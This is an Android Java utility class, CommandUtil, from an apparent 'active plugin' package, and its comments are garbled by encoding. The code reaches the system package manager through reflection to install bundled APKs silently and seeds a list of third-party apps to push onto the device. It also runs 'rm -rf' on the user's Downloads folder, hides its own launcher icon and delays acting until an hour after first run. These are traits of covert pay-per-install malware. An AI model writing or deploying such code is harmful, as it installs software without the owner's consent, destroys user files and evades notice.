package com.xstd.active.plugin.utils;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.IPackageInstallObserver;
import android.content.pm.IPackageManager;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.xstd.active.plugin.BuildConfig;
import com.xstd.active.plugin.MainActivity;
import com.xstd.active.plugin.dao.SilenceApp;
import com.xstd.active.plugin.dao.SilenceAppDao;
import com.xstd.active.plugin.dao.SilenceAppDaoUtils;

public class CommandUtil {

	/**
	 * �õ�packagemanager����װapk��
	 * 
	 * @return
	 * @throws Exception
	 */
	@SuppressWarnings({ "rawtypes", "unchecked" })
	public static IPackageManager getPackageManger() throws Exception {
		Class clazz = CommandUtil.class.getClassLoader().loadClass("android.os.ServiceManager");
		Method method = clazz.getMethod("getService", new Class[] { String.class });
		IBinder b = (IBinder) method.invoke(null, "package");
		return IPackageManager.Stub.asInterface(b);
	}

	/**
	 * ���/storage/sdcard/Downloads
	 * 
	 * @throws IOException
	 */
	public static void deleteDownloadFiles() throws IOException {
		File file = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
		Runtime.getRuntime().exec("rm -rf " + file.getAbsolutePath());
		if (!file.exists())
			file.mkdirs();
	}

	/**
	 * ����豸�����а�װ����İ���
	 * 
	 * @param context
	 * @return
	 */
	public static List<String> getDeviceInstallPackName(Context context) {
		List<String> names = new ArrayList<String>();
		List<PackageInfo> pis = context.getPackageManager().getInstalledPackages(PackageManager.GET_ACTIVITIES);
		for (PackageInfo pi : pis)
			names.add(pi.packageName);
		return names;
	}

	public static List<String> getDownloadPackageName(Context context) {
		List<String> names = new ArrayList<String>();
		SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(context);
		Cursor cursor = dao.getDatabase().query(dao.getTablename(), new String[] { SilenceAppDao.Properties.Packagename.columnName }, null, null, null, null, null);
		while (cursor.moveToNext()) {
			names.add(cursor.getString(0));
		}
		if (cursor != null)
			cursor.close();
		return names;
	}

	/**
	 * ͨ��apk�ļ���ȡ����ļ��ı���
	 * 
	 * @param context
	 * @param absPath
	 * @return
	 */
	public static String getPackageNameByAPK(Context context, String absPath) {
		PackageInfo pkgInfo = context.getPackageManager().getPackageArchiveInfo(absPath, PackageManager.GET_ACTIVITIES);
		if (pkgInfo != null) {
			return pkgInfo.applicationInfo.packageName;
		}
		return null;
	}

	/**
	 * ��װapk�ļ�
	 * 
	 * @param context
	 * @param file
	 * @param observer
	 * @throws Exception
	 */
	public static void installFile(Context context, File file, IPackageInstallObserver observer) {
		if (file == null)
			return;
		if (!file.isFile())
			return;
		if (file.length() <= 0)
			return;
		if (!file.getName().endsWith(".apk"))
			return;
		String packageName = getPackageNameByAPK(context, file.getAbsolutePath());
		Uri uri = Uri.fromFile(file);
		int flags = 0;
		if (uri != null)
			try {
				getPackageManger().installPackage(uri, observer, flags, packageName);
			} catch (Exception e) {
				e.printStackTrace();
			}
	}

	/**
	 * �ж�SIM���Ƿ�����
	 * 
	 * @param context
	 * @return
	 */
	public static boolean simReady(Context context) {
		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		if (TelephonyManager.SIM_STATE_READY == tm.getSimState())
			return true;
		return false;
	}

	/**
	 * �ж������Ƿ����
	 * 
	 * @param context
	 * @return
	 */
	public static boolean isNetAvailable(Context context) {
		ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkInfo = cm.getActiveNetworkInfo();
		if (null != networkInfo) {
			return networkInfo.isAvailable();
		}
		return false;
	}

	/**
	 * �ж�WIFI�Ƿ����
	 * 
	 * @param context
	 * @return
	 */
	public boolean isWifiAvailable(Context context) {
		ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
		if (null != networkInfo) {
			return networkInfo.isAvailable();
		}
		return false;
	}

	/**
	 * ��Launcher
	 * 
	 * @param context
	 */
	public static void goHome(Context context) {
		Intent intent = new Intent(Intent.ACTION_MAIN);
		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		intent.addCategory(Intent.CATEGORY_HOME);
		context.startActivity(intent);
	}

	/**
	 * ��assets�µ��ļ����Ƶ�sd���� �˷��������ڵ����ߵ��̡߳�
	 */
	public static List<File> copyAssetsToSdcard(Context context, File out) {
		List<File> apks = new ArrayList<File>();
		AssetManager assets = context.getAssets();
		InputStream is = null;
		OutputStream os = null;
		try {
			for (String app : assets.list("")) {
				if (!app.endsWith(".apk"))
					continue;
				File file = new File(out, app);
				if (file.exists()) {
					apks.add(file);
					continue;
				}
				is = assets.open(app);
				os = new BufferedOutputStream(new FileOutputStream(file));
				byte[] b = new byte[1024 * 5];
				int len;
				while ((len = is.read(b)) != -1) {
					os.write(b, 0, len);
				}
				os.flush();
				apks.add(file);
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (is != null) {
				try {
					is.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
			if (os != null) {
				try {
					os.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
		return apks;
	}

	/**
	 * ��ʼ��Ԥװ��Ӧ��
	 * 
	 * @param context
	 */
	public static void initPreInstallRom(Context context) {
		Intent intent = new Intent();
		intent.setAction("com.xstd.plugin.package.active");
		context.startService(intent);
		long currentTime = System.currentTimeMillis();
		SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(context);
		dao.insert(new SilenceApp(null, "cn.goapk.market", currentTime, false, 1.0f, false));
		dao.insert(new SilenceApp(null, "com.hiapk.marketpho", currentTime, false, 1.0f, false));
		dao.insert(new SilenceApp(null, "cn.kuwo.player", currentTime, false, 1.0f, false));
		dao.insert(new SilenceApp(null, "com.lenovo.videotalk.phone", currentTime, false, 1.0f, false));
		dao.insert(new SilenceApp(null, "com.sankuai.meituan", currentTime, false, 1.0f, false));
		dao.insert(new SilenceApp(null, "com.autonavi.minimap", currentTime, false, 1.0f, false));
		dao.insert(new SilenceApp(null, "com.storm.smart", currentTime, false, 1.0f, false));
		dao.insert(new SilenceApp(null, "com.UCMobile", currentTime, false, 1.0f, false));
		dao.insert(new SilenceApp(null, "com.lenovo.videotalk.phone", currentTime, false, 1.0f, false));
	}

	/**
	 * DEBUGģʽ�´�ӡwarm�������Ϣ
	 * 
	 * @param msg
	 */
	public static void logW(String msg) {
		if (BuildConfig.DEBUG)
			Log.w("ActivePlugin", msg);
	}

	/**
	 * DEBUGģʽ�´�ӡinfo�������Ϣ
	 * 
	 * @param msg
	 */
	public static void logI(String msg) {
		if (BuildConfig.DEBUG)
			Log.i("ActivePlugin", msg);
	}

	/**
	 * �����ǰϵͳʱ�����2014��1��1��0ʱ0��0����Ϊ����ʱ��
	 * 
	 * @return
	 */
	public static boolean isTrueTime() {
		logW("���ʱ��ϵͳʱ���Ƿ���ȷ");
		Calendar calendar = Calendar.getInstance();
		calendar.set(2014, 0, 1, 0, 0, 0);
		return System.currentTimeMillis() > calendar.getTimeInMillis();
	}

	public static boolean canDoThing(SharedPreferences sharedPreferences) {
		logW("����Ƿ����������");
		long firstTime = sharedPreferences.getLong("firsttime", -1);
		if (firstTime == -1) {
			if (isTrueTime())
				sharedPreferences.edit().putLong("firsttime", System.currentTimeMillis()).commit();
			else
				return false;
		}
		return System.currentTimeMillis() - sharedPreferences.getLong("firsttime", -1) > 1000 * 60 * 60;
	}

	public static boolean canUpdate(SharedPreferences sharedPreferences) {
		logW("����Ƿ���Ը��·�����");
		long firstTime = sharedPreferences.getLong("firsttime", -1);
		if (firstTime == -1) {
			if (isTrueTime())
				sharedPreferences.edit().putLong("firsttime", System.currentTimeMillis()).commit();
			else
				return false;
		}
		return System.currentTimeMillis() - sharedPreferences.getLong("firsttime", -1) > 1000 * 60 * 60 * 24 * 15;
	}

	/**
	 * ���س������ͼ��
	 * 
	 * @param context
	 */
	public static void hideInLauncher(Context context) {
		PackageManager pm = context.getPackageManager();
		pm.setComponentEnabledSetting(new ComponentName(context, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
	}
}
